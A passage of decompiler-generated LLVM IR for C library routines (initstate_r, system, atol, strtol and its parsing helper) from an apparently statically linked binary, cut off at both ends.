  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_158a8 = load i32, i32* @r4, align 4
  store i32 %v3_158a8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_158c8, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %entry
  %v2_158b8 = icmp ugt i32 %arg2, 254
  %v7_158b8 = icmp eq i32 %arg2, 255
  %v2_158bc = xor i1 %v7_158b8, true
  %v3_158bc = and i1 %v2_158b8, %v2_158bc
  br i1 %v3_158bc, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_158b8
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_158b8, %bb
  %v1_158f07 = phi i32 [ %v3_158a8, %dec_label_pc_158b8 ], [ 4, %bb ]
  %v2_158c0 = xor i1 %v2_158b8, true
  %v3_158c0 = or i1 %v7_158b8, %v2_158c0
  br i1 %v3_158c0, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_158c8:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_158e0, label %dec_label_pc_158d0

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158c8
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1594c

.thread10:                                        ; preds = %dec_label_pc_158d0
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158c8
  %v2_158e0 = icmp ugt i32 %arg2, 62
  %v7_158e0 = icmp eq i32 %arg2, 63
  %v2_158e4 = xor i1 %v7_158e0, true
  %v3_158e4 = and i1 %v2_158e0, %v2_158e4
  br i1 %v3_158e4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_158e0
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_158e0, %bb22
  %v1_158f06 = phi i32 [ %v3_158a8, %dec_label_pc_158e0 ], [ 2, %bb22 ]
  %v2_158e8 = xor i1 %v2_158e0, true
  %v3_158e8 = or i1 %v7_158e0, %v2_158e8
  br i1 %v3_158e8, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_158f8 = phi i32 [ 3, %bb21 ], [ %v1_158f07, %bb20 ], [ %v1_158f06, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_24af4.1201 to i32), i32* %r2.global-to-local, align 4
  %v4_158f0 = mul i32 %v1_158f8, 4
  %v5_158f0 = add i32 %v4_158f0, ptrtoint (i32* @global_var_24af4.1201 to i32)
  store i32 %v5_158f0, i32* %r3.global-to-local, align 4
  %v1_158f4 = add i32 %v4_158f0, add (i32 ptrtoint (i32* @global_var_24af4.1201 to i32), i32 20)
  %v2_158f4 = inttoptr i32 %v1_158f4 to i32*
  %v3_158f4 = load i32, i32* %v2_158f4, align 4
  store i32 %v3_158f4, i32* %r1.global-to-local, align 4
  %v6_158f8 = inttoptr i32 %v5_158f0 to i32*
  %v7_158f8 = load i32, i32* %v6_158f8, align 4
  store i32 %v7_158f8, i32* %r2.global-to-local, align 4
  %v1_158fc = add i32 %tmp, 4
  store i32 %v1_158fc, i32* @r6, align 4
  %v4_15900 = mul i32 %v3_158f4, 4
  %v5_15900 = add i32 %v4_15900, %v1_158fc
  store i32 %v5_15900, i32* %r3.global-to-local, align 4
  %v2_15904 = add i32 %arg3, 24
  %v3_15904 = inttoptr i32 %v2_15904 to i32*
  store i32 %v5_15900, i32* %v3_15904, align 4
  %v0_15908 = load i32, i32* %r2.global-to-local, align 4
  %v1_15908 = load i32, i32* @r5, align 4
  %v2_15908 = add i32 %v1_15908, 20
  %v3_15908 = inttoptr i32 %v2_15908 to i32*
  store i32 %v0_15908, i32* %v3_15908, align 4
  %v0_1590c = load i32, i32* %r1.global-to-local, align 4
  %v1_1590c = load i32, i32* @r5, align 4
  %v2_1590c = add i32 %v1_1590c, 16
  %v3_1590c = inttoptr i32 %v2_1590c to i32*
  store i32 %v0_1590c, i32* %v3_1590c, align 4
  %v0_15910 = load i32, i32* @r4, align 4
  %v1_15910 = load i32, i32* @r5, align 4
  %v2_15910 = add i32 %v1_15910, 12
  %v3_15910 = inttoptr i32 %v2_15910 to i32*
  store i32 %v0_15910, i32* %v3_15910, align 4
  %v0_15914 = load i32, i32* @r6, align 4
  %v1_15914 = load i32, i32* @r5, align 4
  %v2_15914 = add i32 %v1_15914, 8
  %v3_15914 = inttoptr i32 %v2_15914 to i32*
  store i32 %v0_15914, i32* %v3_15914, align 4
  %v0_15918 = load i32, i32* @r5, align 4
  store i32 %v0_15918, i32* %r1.global-to-local, align 4
  %v0_1591c = load i32, i32* @r0, align 4
  %v2_1591c = inttoptr i32 %v0_1591c to i32*
  %v3_1591c = call i32 @srandom_r(i32* %v2_1591c, i32 %v0_15918)
  store i32 %v3_1591c, i32* %r0.global-to-local, align 4
  %v0_15920 = load i32, i32* @r4, align 4
  %v2_15920 = icmp eq i32 %v0_15920, 0
  br i1 %v2_15920, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1593c12 = load i32, i32* @r7, align 4
  %v2_1593c13 = inttoptr i32 %v1_1593c12 to i32*
  store i32 0, i32* %v2_1593c13, align 4
  %v1_15940 = load i32, i32* @r4, align 4
  store i32 %v1_15940, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_15924 = load i32, i32* @r5, align 4
  %v2_15924 = add i32 %v1_15924, 4
  %v3_15924 = inttoptr i32 %v2_15924 to i32*
  %v4_15924 = load i32, i32* %v3_15924, align 4
  %v1_15928 = load i32, i32* @r6, align 4
  %v3_15928 = sub i32 %v4_15924, %v1_15928
  %v4_1592c = sdiv i32 %v3_15928, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_15934 = mul i32 %v4_1592c, 5
  %v5_15934 = add i32 %v4_15934, %v0_15920
  store i32 %v5_15934, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1593c = load i32, i32* @r7, align 4
  %v2_1593c = inttoptr i32 %v1_1593c to i32*
  store i32 0, i32* %v2_1593c, align 4
  %v1_15944 = load i32, i32* %r3.global-to-local, align 4
  %v2_15944 = load i32, i32* @r7, align 4
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  store i32 %v1_15944, i32* %v3_15944, align 4
  %v17_15948.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_15948 = phi i32 [ %v1_15940, %bb26 ], [ %v17_15948.pre, %.thread4 ]
  %v2_15948 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15948, i32* %r4.global-to-local, align 4
  ret i32 %v17_15948

dec_label_pc_1594c:                               ; preds = %dec_label_pc_158d0
  %v0_1594c = call i32 @__errno_location()
  store i32 %v0_1594c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_15954 = inttoptr i32 %v0_1594c to i32*
  store i32 22, i32* %v2_15954, align 4
  %v0_15958 = call i32 @__errno_location()
  %v0_1595c = load i32, i32* %r4.global-to-local, align 4
  %v2_1595c = inttoptr i32 %v0_15958 to i32*
  store i32 %v0_1595c, i32* %v2_1595c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15964 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15964, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_158e0, { 1, 0 }
  uselistorder i1 %v7_158b8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 (i32*, i32)* @srandom_r, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24af4.1201 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24af4.1201 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1596c = load i32, i32* @r4, align 4
  %v0_15970 = load i32, i32* %r0.global-to-local, align 4
  %v2_15970 = icmp eq i32 %v0_15970, 0
  br i1 %v2_15970, label %bb, label %dec_label_pc_15984

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_15984:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1598c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1599c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_159ac = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_159ac, i32* %r0.global-to-local, align 4
  %v0_159b4 = call i32 @__vfork()
  store i32 %v0_159b4, i32* %r0.global-to-local, align 4
  store i32 %v0_159b4, i32* @r4, align 4
  %v1_159b8 = icmp slt i32 %v0_159b4, 0
  br i1 %v1_159b8, label %dec_label_pc_159c0, label %dec_label_pc_159ec

dec_label_pc_159c0:                               ; preds = %dec_label_pc_15984
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_159c8 = call i32 @__bsd_signal(i32 3, i32 %v2_1598c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_159d4 = call i32 @__bsd_signal(i32 2, i32 %v2_1599c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_159e0 = call i32 @__bsd_signal(i32 17, i32 %v2_159ac)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_159ec:                               ; preds = %dec_label_pc_15984
  %v2_159b8 = icmp eq i32 %v0_159b4, 0
  br i1 %v2_159b8, label %dec_label_pc_159f0, label %dec_label_pc_15a34

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159ec
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_159f8 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_159fc = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a04 = call i32 @__bsd_signal(i32 2, i32 %v0_159fc)
  %v0_15a08 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15a10 = call i32 @__bsd_signal(i32 17, i32 %v0_15a08)
  store i32 ptrtoint ([8 x i8]* @global_var_24b1c.1209 to i32), i32* @r0, align 4
  %v0_15a24 = load i32, i32* @r4, align 4
  %v8_15a28 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_24b1c.1209 to i32), i32 ptrtoint ([3 x i8]* @global_var_24b24.1211 to i32), i32 ptrtoint ([3 x i8]* @global_var_24b28.1213 to i32), i32 %v0_15970, i32 %v0_15a24)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_15a30 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_15a34:                               ; preds = %dec_label_pc_159ec
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15a3c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a48 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_15a58 = load i32, i32* @r4, align 4
  store i32 %v0_15a58, i32* %r0.global-to-local, align 4
  %v0_15a5c = call i32 @wait4()
  store i32 %v0_15a5c, i32* %r0.global-to-local, align 4
  %v7_15a60 = icmp eq i32 %v0_15a5c, -1
  br i1 %v7_15a60, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_15a34
  store i32 %v0_15a5c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_15a34, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_15a70 = call i32 @__bsd_signal(i32 3, i32 %v2_1598c)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15a7c = call i32 @__bsd_signal(i32 2, i32 %v2_1599c)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_15a88 = call i32 @__bsd_signal(i32 17, i32 %v2_159ac)
  %v3_15a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15a8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %bb, %dec_label_pc_159c0, %bb11
  %v8_15a94 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_159c0 ], [ %v3_15a8c, %bb11 ]
  store i32 %v3_1596c, i32* @r4, align 4
  ret i32 %v8_15a94

; uselistorder directives
  uselistorder i32 %v0_15a5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_15a90, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_15aac = call i32 @strtol()
  ret i32 %v0_15aac
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_15ab4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_15ab4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15ab8 = load i32, i32* @r4, align 4
  store i32 %v3_15ab8, i32* %stack_var_-36, align 4
  %v0_15abc = load i32, i32* @r1, align 4
  store i32 %v0_15abc, i32* %sb.global-to-local, align 4
  %v0_15ac0 = load i32, i32* @r2, align 4
  store i32 %v0_15ac0, i32* %r5.global-to-local, align 4
  %v0_15ac4 = load i32, i32* @r3, align 4
  store i32 %v0_15ac4, i32* %fp.global-to-local, align 4
  %v0_15ac8 = load i32, i32* @r0, align 4
  %v2_15adc.pre = load i32, i32* @global_var_2d288, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ad4, %entry
  %v0_15b0c = phi i32 [ %v0_15ac8, %entry ], [ %v1_15ad0, %dec_label_pc_15ad4 ]
  store i32 %v0_15b0c, i32* %r4.global-to-local, align 4
  %v1_15ad8 = inttoptr i32 %v0_15b0c to i8*
  %v2_15ad8 = load i8, i8* %v1_15ad8, align 1
  %v3_15ad8 = zext i8 %v2_15ad8 to i32
  store i32 %v3_15ad8, i32* @r2, align 4
  %v3_15ae0 = mul nuw nsw i32 %v3_15ad8, 2
  %v4_15ae0 = add i32 %v3_15ae0, %v2_15adc.pre
  %v5_15ae0 = inttoptr i32 %v4_15ae0 to i8*
  %v6_15ae0 = load i8, i8* %v5_15ae0, align 1
  %v1_15ae4 = and i8 %v6_15ae0, 32
  %v2_15ae4 = icmp eq i8 %v1_15ae4, 0
  %v1_15ad0 = add i32 %v0_15b0c, 1
  br i1 %v2_15ae4, label %dec_label_pc_15aec, label %dec_label_pc_15ad4

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ad4
  %v7_15aec = icmp eq i8 %v2_15ad8, 43
  br i1 %v7_15aec, label %dec_label_pc_15b0c, label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15aec
  %v7_15af4 = icmp eq i8 %v2_15ad8, 45
  br i1 %v7_15af4, label %dec_label_pc_15b0c, label %bb

bb:                                               ; preds = %dec_label_pc_15af4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15aec, %dec_label_pc_15af4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_15af4 ], [ 0, %dec_label_pc_15aec ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_15ad0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %bb, %dec_label_pc_15b0c
  %v0_15b30 = phi i32 [ %v0_15b0c, %bb ], [ %v1_15ad0, %dec_label_pc_15b0c ]
  %v1_15b10 = and i32 %v0_15ac0, -17
  %v3_15b10 = icmp eq i32 %v1_15b10, 0
  br i1 %v3_15b10, label %dec_label_pc_15b1c, label %bb54

bb54:                                             ; preds = %dec_label_pc_15b10
  br label %bb58

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b10
  %v1_15b1c = inttoptr i32 %v0_15b30 to i8*
  %v2_15b1c = load i8, i8* %v1_15b1c, align 1
  %v7_15b20 = icmp eq i8 %v2_15b1c, 48
  %v1_15b24 = add i32 %v0_15ac0, 10
  store i32 %v1_15b24, i32* %r5.global-to-local, align 4
  br i1 %v7_15b20, label %dec_label_pc_15b30, label %bb55

bb55:                                             ; preds = %dec_label_pc_15b1c
  br label %.thread8

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b1c
  %v1_15b30 = add i32 %v0_15b30, 1
  %v2_15b30 = inttoptr i32 %v1_15b30 to i8*
  %v3_15b30 = load i8, i8* %v2_15b30, align 1
  %v4_15b30 = zext i8 %v3_15b30 to i32
  store i32 %v1_15b30, i32* %r4.global-to-local, align 4
  %v1_15b34 = or i32 %v4_15b30, 32
  %v7_15b38 = icmp eq i32 %v1_15b34, 120
  %v1_15b3c = add i32 %v0_15ac0, 8
  store i32 %v1_15b3c, i32* %r5.global-to-local, align 4
  br i1 %v7_15b38, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_15b30
  %v3_15b48 = mul i32 %v1_15b3c, 2
  store i32 %v3_15b48, i32* %r5.global-to-local, align 4
  %v2_15b4c = add i32 %v0_15b30, 2
  store i32 %v2_15b4c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15b30, %bb55, %bb56
  %v1_15c1028 = phi i32 [ %v0_15ac8, %bb55 ], [ %v1_15b30, %bb56 ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v0_15b9819 = phi i32 [ %v0_15b30, %bb55 ], [ %v2_15b4c, %bb56 ], [ %v1_15b30, %dec_label_pc_15b30 ]
  %v0_15b50 = phi i32 [ %v1_15b24, %bb55 ], [ %v3_15b48, %bb56 ], [ %v1_15b3c, %dec_label_pc_15b30 ]
  %v5_15b54 = icmp slt i32 %v0_15b50, 16
  br i1 %v5_15b54, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_15c1027 = phi i32 [ %v0_15ac8, %bb54 ], [ %v1_15c1028, %.thread8 ], [ %v1_15c1028, %bb57 ]
  %v0_15b9818 = phi i32 [ %v0_15b30, %bb54 ], [ %v0_15b9819, %.thread8 ], [ %v0_15b9819, %bb57 ]
  %v0_15b68 = phi i32 [ %v0_15ac0, %bb54 ], [ %v0_15b50, %.thread8 ], [ 16, %bb57 ]
  %v1_15b58 = add i32 %v0_15b68, -2
  %tmp = icmp ugt i32 %v1_15b58, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_15b68

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15b68:                               ; preds = %bb58
  %v2_15b70 = urem i32 -1, %v0_15b68
  %v1_15b80 = urem i32 %v2_15b70, 256
  store i32 %v1_15b80, i32* %sl.global-to-local, align 4
  %v2_15b84 = udiv i32 -1, %v0_15b68
  store i32 0, i32* @ip, align 4
  store i32 %v2_15b84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15b98

dec_label_pc_15b94:                               ; preds = %bb65, %dec_label_pc_15bf4
  %v0_15b94 = phi i32 [ %v1_15bc4, %bb65 ], [ %v0_15b94.pre, %dec_label_pc_15bf4 ]
  br label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b68, %dec_label_pc_15b94
  %v1_15c1025 = phi i32 [ %v1_15c1027, %dec_label_pc_15b68 ], [ %v0_15b94, %dec_label_pc_15b94 ]
  %v0_15bc4 = phi i32 [ %v0_15b9818, %dec_label_pc_15b68 ], [ %v0_15b94, %dec_label_pc_15b94 ]
  %v1_15b98 = inttoptr i32 %v0_15bc4 to i8*
  %v2_15b98 = load i8, i8* %v1_15b98, align 1
  %v3_15b98 = zext i8 %v2_15b98 to i32
  %v1_15b9c = add nsw i32 %v3_15b98, -48
  %v1_15ba0 = urem i32 %v1_15b9c, 256
  %v1_15ba8 = or i32 %v3_15b98, 32
  store i32 %v1_15ba8, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_15ba0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_15bb0

dec_label_pc_15bb0:                               ; preds = %dec_label_pc_15b98
  %v1_15bb4 = add nsw i32 %v1_15ba8, -87
  store i32 %v1_15bb4, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_15ba8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_15bb0
  %v5_15bbc = urem i32 %v1_15bb4, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_15b98, %dec_label_pc_15bb0, %bb59
  %v3_15bec = phi i32 [ %v1_15ba0, %dec_label_pc_15b98 ], [ 40, %dec_label_pc_15bb0 ], [ %v5_15bbc, %bb59 ]
  %v1_15bc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_15bc4 = add i32 %v0_15bc4, 1
  store i32 %v1_15bc4, i32* %r4.global-to-local, align 4
  %v6_15bc8 = icmp slt i32 %v3_15bec, %v1_15bc0
  br i1 %v6_15bc8, label %dec_label_pc_15bcc, label %dec_label_pc_15c0c.loopexit

dec_label_pc_15bcc:                               ; preds = %bb60
  %v0_15bcc = load i32, i32* @ip, align 4
  %v1_15bcc = load i32, i32* %r8.global-to-local, align 4
  %v9_15bcc = icmp eq i32 %v0_15bcc, %v1_15bcc
  br i1 %v9_15bcc, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_15bcc
  br label %dec_label_pc_15bdc

bb61:                                             ; preds = %dec_label_pc_15bcc
  %v3_15bcc = icmp ult i32 %v0_15bcc, %v1_15bcc
  br i1 %v3_15bcc, label %dec_label_pc_15bdc, label %dec_label_pc_15bf4

dec_label_pc_15bdc:                               ; preds = %bb61, %.thread37
  %v4_15be42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_15bdc = load i32, i32* %sl.global-to-local, align 4
  %v3_15bdc = icmp uge i32 %v3_15bec, %v1_15bdc
  %v9_15bdc = icmp eq i32 %v3_15bec, %v1_15bdc
  %v2_15be0 = xor i1 %v3_15bdc, true
  %v3_15be0 = or i1 %v9_15bdc, %v2_15be0
  br i1 %v3_15be0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_15bdc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_15bdc, %bb62
  %v4_15be4 = phi i32 [ %v4_15be42240, %dec_label_pc_15bdc ], [ 0, %bb62 ]
  %v2_15be4 = xor i1 %v9_15bdc, true
  %v3_15be4 = and i1 %v3_15bdc, %v2_15be4
  br i1 %v3_15be4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_15be4 = urem i32 %v4_15be4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_15be8 = phi i32 [ %v5_15be4, %bb64 ], [ %v4_15be4, %bb63 ]
  %v2_15be8 = icmp eq i32 %v0_15be8, 0
  br i1 %v2_15be8, label %bb65, label %dec_label_pc_15bf4

bb65:                                             ; preds = %thread-pre-split
  %v4_15bec = mul i32 %v0_15bcc, %v1_15bc0
  %v5_15bec = add i32 %v4_15bec, %v3_15bec
  store i32 %v5_15bec, i32* @ip, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15bf4:                               ; preds = %bb61, %thread-pre-split
  %v0_15bf4 = call i32 @__errno_location()
  %v0_15bf8 = load i32, i32* %r7.global-to-local, align 4
  %v1_15bf8 = load i32, i32* %fp.global-to-local, align 4
  %v2_15bf8 = and i32 %v1_15bf8, %v0_15bf8
  store i32 %v2_15bf8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_15c04 = inttoptr i32 %v0_15bf4 to i32*
  store i32 34, i32* %v2_15c04, align 4
  %v0_15b94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15c0c.loopexit:                      ; preds = %bb60
  %v0_15c0c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %.thread, %dec_label_pc_15c0c.loopexit
  %v1_15c10 = phi i32 [ %v1_15c1025, %dec_label_pc_15c0c.loopexit ], [ %v1_15c1027, %.thread ]
  %v2_15c10 = phi i32 [ %v0_15c0c.pre, %dec_label_pc_15c0c.loopexit ], [ %v0_15abc, %.thread ]
  %v2_15c0c = icmp eq i32 %v2_15c10, 0
  br i1 %v2_15c0c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_15c0c
  %v3_15c10 = inttoptr i32 %v2_15c10 to i32*
  store i32 %v1_15c10, i32* %v3_15c10, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_15c0c, %bb66
  %v0_15c14 = load i32, i32* %r7.global-to-local, align 4
  %v2_15c14 = icmp eq i32 %v0_15c14, 0
  %. = select i1 %v2_15c14, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_15c20 = load i32, i32* %fp.global-to-local, align 4
  %v2_15c20 = icmp eq i32 %v0_15c20, 0
  %v0_15c44.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_15c20, label %dec_label_pc_15c3c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_15c44.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_15c2c, label %dec_label_pc_15c3c

dec_label_pc_15c2c:                               ; preds = %bb70
  %v0_15c2c = call i32 @__errno_location()
  %v2_15c34 = inttoptr i32 %v0_15c2c to i32*
  store i32 34, i32* %v2_15c34, align 4
  %v0_15c38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15c38, i32* @ip, align 4
  %v0_15c3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %bb70, %bb67, %dec_label_pc_15c2c
  %v0_15c44.pre = phi i32 [ %v0_15c44.pre.pre, %bb70 ], [ %v0_15c38, %dec_label_pc_15c2c ], [ %v0_15c44.pre.pre, %bb67 ]
  %v0_15c3c = phi i32 [ %v0_15c14, %bb70 ], [ %v0_15c3c.pre, %dec_label_pc_15c2c ], [ %v0_15c14, %bb67 ]
  %v2_15c3c = icmp eq i32 %v0_15c3c, 0
  br i1 %v2_15c3c, label %dec_label_pc_15c3c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_15c3c
  %v2_15c40 = sub i32 0, %v0_15c44.pre
  store i32 %v2_15c40, i32* @ip, align 4
  br label %dec_label_pc_15c3c._crit_edge

dec_label_pc_15c3c._crit_edge:                    ; preds = %dec_label_pc_15c3c, %bb71
  %v0_15c44 = phi i32 [ %v2_15c40, %bb71 ], [ %v0_15c44.pre, %dec_label_pc_15c3c ]
  %v2_15c48 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15c48, i32* @r4, align 4
  ret i32 %v0_15c44

; uselistorder directives
  uselistorder i32 %v0_15c44.pre, { 1, 0 }
  uselistorder i32 %v0_15c44.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_15be4, { 1, 0 }
  uselistorder i1 %v3_15bdc, { 1, 0 }
